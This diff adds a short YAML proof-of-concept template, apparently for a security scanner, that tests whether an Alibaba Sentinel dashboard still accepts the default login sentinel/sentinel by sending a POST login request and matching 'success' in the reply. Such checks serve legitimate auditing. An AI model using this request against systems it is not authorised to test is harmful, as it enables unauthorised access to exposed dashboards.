@@ -1,0 +1,12 @@
+name: poc-yaml-Alibaba-Sentinel-default-user
+description: "登录方式:sentinel/sentinel"
+method: POST
+headers:
+  Content-Type: "application/x-www-form-urlencoded"
+  Authorization: "Basic Og=="
+path:
+  - //auth/login?password=sentinel&username=sentinel
+expression:
+  status: 200
+  body_any:
+  - "success"
